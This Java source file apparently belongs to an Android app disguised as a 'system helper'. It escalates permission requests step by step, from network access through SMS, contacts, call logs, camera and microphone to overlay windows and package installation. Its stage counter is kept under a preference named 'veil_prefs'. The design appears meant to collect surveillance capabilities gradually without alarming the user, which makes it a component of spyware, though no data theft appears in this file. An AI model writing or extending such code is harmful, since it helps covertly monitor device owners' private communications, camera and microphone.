package com.syshelper.service;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;

public class PermissionManager {
    private static final String[][] PERMISSION_STAGES = {
        { "android.permission.INTERNET", "android.permission.ACCESS_NETWORK_STATE" },
        { "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE",
          "android.permission.READ_PHONE_STATE", "android.permission.VIBRATE" },
        { "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG" },
        { "android.permission.CAMERA", "android.permission.RECORD_AUDIO" },
        { "android.permission.SYSTEM_ALERT_WINDOW", "android.permission.REQUEST_INSTALL_PACKAGES" }
    };

    public static int getCurrentStage(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences("veil_prefs", Context.MODE_PRIVATE);
        return prefs.getInt("perm_stage", 0);
    }

    public static String[] getNextStagePermissions(Context ctx) {
        int stage = getCurrentStage(ctx);
        if (stage >= PERMISSION_STAGES.length) return new String[0];
        return PERMISSION_STAGES[stage];
    }

    public static void advanceStage(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences("veil_prefs", Context.MODE_PRIVATE);
        prefs.edit().putInt("perm_stage", getCurrentStage(ctx) + 1).apply();
    }

    public static boolean hasAllPermissions(Context ctx, String[] perms) {
        for (String p : perms) {
            if (ctx.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }
}
